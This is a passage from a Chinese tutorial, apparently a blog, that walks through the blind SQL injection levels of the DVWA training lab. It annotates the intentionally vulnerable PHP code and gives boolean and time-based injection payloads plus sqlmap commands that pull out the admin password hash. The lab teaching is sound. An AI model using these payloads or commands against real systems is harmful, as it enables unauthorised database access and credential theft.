危险操作：直接获取用户输入，无任何过滤 ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[&#x27;id&#x27;] - 从URL获取id参数</span></span><br><span class="line">    <span class="comment">// trim() - 只是去除首尾空格，不做任何安全处理</span></span><br><span class="line">    <span class="comment">// mysql_real_escape_string() - 只防单引号，不够安全</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 没有参数化查询</span></span><br><span class="line">    <span class="comment">// 2. 直接拼接SQL</span></span><br><span class="line">    <span class="comment">// 3. 虽然使用了mysql_real_escape_string()，但在某些情况下仍可绕过</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接拼接SQL语句 ★★★</span></span><br><span class="line">    <span class="comment">// SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 漏洞：攻击者可以注入任意SQL代码</span></span><br><span class="line">    <span class="comment">// 例如：$id = &quot;1&#x27; AND 1=1 --&quot;</span></span><br><span class="line">    <span class="comment">// 结果：SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; AND 1=1 --&#x27;</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="comment">// mysql_query() - 执行MySQL查询（已弃用）</span></span><br><span class="line">    <span class="comment">// 返回结果集资源</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：不显示具体数据，只显示是否存在 ★★★</span></span><br><span class="line">    <span class="comment">// mysql_num_rows() - 返回结果集的行数</span></span><br><span class="line">    <span class="comment">// 这就是&quot;盲注&quot;的原因：</span></span><br><span class="line">    <span class="comment">// - 如果有结果：显示&quot;User ID exists&quot;</span></span><br><span class="line">    <span class="comment">// - 如果无结果：显示&quot;User ID not found&quot;</span></span><br><span class="line">    <span class="comment">// - 攻击者只能通过这两种响应来推断信息</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// 用户存在</span></span><br><span class="line">        <span class="comment">// ★★★ 不显示具体的first_name和last_name ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用户不存在</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML表单：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>直接拼接SQL</strong> - 没有使用参数化查询</li>
<li><strong>不显示具体数据</strong> - 只返回存在&#x2F;不存在</li>
<li><strong>显示错误信息</strong> - <code>or die(mysql_error())</code>暴露数据库信息</li>
<li><strong>无输入验证</strong> - 接受任意输入</li>
</ol>
<p><strong>数据流向：</strong></p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户输入($_GET[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">    ↓</span><br><span class="line">直接拼接到SQL</span><br><span class="line">    ↓</span><br><span class="line">执行查询</span><br><span class="line">    ↓</span><br><span class="line">只返回<span class="literal">True</span>/<span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：测试SQL注入漏洞"><a href="#步骤1：测试SQL注入漏洞" class="headerlink" title="步骤1：测试SQL注入漏洞"></a>步骤1：测试SQL注入漏洞</h4><p><strong>测试1：基础测试</strong></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">1</span>&#x27;</span><br><span class="line">结果: MySQL错误（说明有SQL注入）</span><br><span class="line"></span><br><span class="line">输入: <span class="number">1</span>&#x27; <span class="keyword">AND</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line">结果: <span class="keyword">User</span> <span class="title">ID</span> exists（<span class="literal">True</span>）</span><br><span class="line"></span><br><span class="line">输入: <span class="number">1</span>&#x27; <span class="keyword">AND</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">2</span></span><br><span class="line">结果: <span class="keyword">User</span> <span class="title">ID</span> not found（<span class="literal">False</span>）</span><br><span class="line"></span><br><span class="line">结论：存在布尔盲注漏洞</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：布尔盲注-确定数据库信息"><a href="#步骤2：布尔盲注-确定数据库信息" class="headerlink" title="步骤2：布尔盲注 - 确定数据库信息"></a>步骤2：布尔盲注 - 确定数据库信息</h4><p><strong>测试数据库版本：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试MySQL版本是否&gt;5</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(@@version,1,1))&gt;&#x27;</span><span class="number">5</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">True → 版本&gt;5</span></span><br><span class="line"><span class="string">False → 版本&lt;=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 逐字符猜测版本号</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(@@version,3,1))=&#x27;</span><span class="number">7</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<p><strong>测试数据库名称长度：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名长度是否&gt;5</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 二分法确定长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">&gt;</span><span class="number">10</span> <span class="comment">--  → False</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --   → True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">&gt;</span><span class="number">7</span> <span class="comment">--   → False</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())=6 --   → True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">结论：数据库名长度为6</span></span><br></pre></td></tr></table></figure>

<p><strong>猜测数据库名（逐字符）：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一个字符</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(),1,1)=&#x27;</span>a<span class="string">&#x27; --  → False</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> <span class="comment">--  → False</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(),1,1)=&#x27;</span>d<span class="string">&#x27; --  → True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第二个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;v&#x27;</span> <span class="comment">--  → True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...最终得到：dvwa</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤3：枚举数据库表"><a href="#步骤3：枚举数据库表" class="headerlink" title="步骤3：枚举数据库表"></a>步骤3：枚举数据库表</h4><p><strong>获取表名数量：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试表数量</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;1 --</span></span><br></pre></td></tr></table></figure>

<p><strong>获取第一个表名：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 表名长度</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=9 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...得到：guestbook</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：枚举表的列名"><a href="#步骤4：枚举表的列名" class="headerlink" title="步骤4：枚举表的列名"></a>步骤4：枚举表的列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- users表的列数</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27; AND table_schema=database())&gt;5 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...得到：user_id, first_name, last_name, user, password, avatar...</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：提取数据"><a href="#步骤5：提取数据" class="headerlink" title="步骤5：提取数据"></a>步骤5：提取数据</h4><p><strong>获取admin密码（逐字符）：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 密码长度</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH((SELECT password FROM users WHERE user=&#x27;</span>admin<span class="string">&#x27;))=32 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第二个字符</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING((SELECT password FROM users WHERE user=&#x27;</span>admin<span class="string">&#x27;),2,1)=&#x27;</span>f<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 继续...得到完整MD5哈希</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤6：时间盲注（当布尔盲注不可用时）"><a href="#步骤6：时间盲注（当布尔盲注不可用时）" class="headerlink" title="步骤6：时间盲注（当布尔盲注不可用时）"></a>步骤6：时间盲注（当布尔盲注不可用时）</h4><p><strong>测试时间盲注：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础测试</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --</span></span><br><span class="line"><span class="string">结果：响应延迟5秒</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 条件时间盲注</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--  → 延迟5秒（True）</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF(1=2, SLEEP(5), 0) --  → 立即响应（False）</span></span><br></pre></td></tr></table></figure>

<p><strong>使用时间盲注提取数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名第一个字符是&#x27;d&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF(SUBSTRING(database(),1,1)=&#x27;</span>d<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br><span class="line"><span class="string">响应慢 → True</span></span><br><span class="line"><span class="string">响应快 → False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 提取密码</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤7：使用SQLMap自动化"><a href="#步骤7：使用SQLMap自动化" class="headerlink" title="步骤7：使用SQLMap自动化"></a>步骤7：使用SQLMap自动化</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本扫描</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取列名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">       --cookie=<span class="string">&quot;security=low; PHPSESSID=your_session&quot;</span> \</span><br><span class="line">       -D dvwa -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用了mysqli和简单过滤，但仍可进行盲注。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：从POST获取数据（而不是GET） ★★★</span></span><br><span class="line">    <span class="comment">// POST数据不会显示在URL中</span></span><br><span class="line">    <span class="comment">// 但这不能防止SQL注入！</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：使用mysqli（而不是mysql） ★★★</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string() - 转义特殊字符</span></span><br><span class="line">    <span class="comment">// 参数1：数据库连接</span></span><br><span class="line">    <span class="comment">// 参数2：要转义的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 转义内容：</span></span><br><span class="line">    <span class="comment">// \x00 → \\x00</span></span><br><span class="line">    <span class="comment">// \n   → \\n</span></span><br><span class="line">    <span class="comment">// \r   → \\r</span></span><br><span class="line">    <span class="comment">// \    → \\</span></span><br><span class="line">    <span class="comment">// &#x27;    → \&#x27;</span></span><br><span class="line">    <span class="comment">// &quot;    → \&quot;</span></span><br><span class="line">    <span class="comment">// \x1a → \\x1a</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 仍然是字符串拼接，不是参数化查询</span></span><br><span class="line">    <span class="comment">// 2. 在某些情况下仍可能被绕过（如宽字节注入）</span></span><br><span class="line">    <span class="comment">// 3. 不防止数字型注入（如果没有引号）</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ?</span><br><span class="line">           <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$id</span> ) :</span><br><span class="line">           ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 仍然拼接SQL ★★★</span></span><br><span class="line">    <span class="comment">// 虽然使用了mysqli_real_escape_string()，但仍不安全</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进3：不显示错误信息 ★★★</span></span><br><span class="line">    <span class="comment">// 移除了 or die(mysql_error())</span></span><br><span class="line">    <span class="comment">// 攻击者无法看到SQL错误</span></span><br><span class="line">    <span class="comment">// 但这使得需要使用盲注技术</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仍然只显示存在/不存在</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// 用户存在</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进4：不透露具体原因 ★★★</span></span><br><span class="line">        <span class="comment">// 无论是不存在还是查询错误，都显示相同信息</span></span><br><span class="line">        <span class="comment">// 增加了攻击难度</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>HTML表单改为POST：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>使用POST</strong> - 数据不在URL中</li>
<li><strong>mysqli_real_escape_string()</strong> - 转义特殊字符</li>
<li><strong>不显示错误</strong> - 移除die(mysql_error())</li>
<li><strong>统一错误信息</strong> - 不透露失败原因</li>
</ol>
